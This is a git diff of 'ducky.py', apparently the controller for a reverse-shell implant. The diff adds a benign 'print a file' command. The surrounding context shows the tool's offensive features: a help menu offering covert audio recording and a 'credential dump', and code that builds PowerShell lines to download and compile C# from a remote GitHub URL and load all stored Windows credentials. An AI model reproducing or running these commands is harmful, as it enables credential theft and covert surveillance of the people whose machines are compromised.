@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 # ducky.py
 # Ashish D'Souza
-# January 16th, 2019
+# February 5th, 2019
 
 import socket
 import threading
@@ -172,6 +172,7 @@ while not stop:
             print("ducky/audio          N/A          Record audio for 10 seconds and save in reverse shell directory")
             print("                     [seconds]    Record audio for a specified number of seconds")
             print("ducky/creds          N/A          Preform a credential dump")
+            print("ducky/print          [file]       Print a file to the default printer")
             stdin = ""
         elif ducky_command[:4] == "quit":
             options = [x for x in ducky_command.split(" ")[1:] if x]
@@ -339,6 +340,11 @@ while not stop:
             commands = []
             commands.append("(add-type -typedefinition (ds \"http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/dump-creds.cs\") -language csharp -passthru)>$null")
             commands.append("try{([credential]::loadall()|out-string).trim()}catch{echo \"No credentials found.\"}")
+            stdin = "; ".join(commands)
+        elif ducky_command[:5] == "print":
+            options = [x for x in ducky_command.split(" ")[1:] if x]
+            commands = []
+            commands.append("start-process -filepath \"" + options[0] + "\" -verb print")
             stdin = "; ".join(commands)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
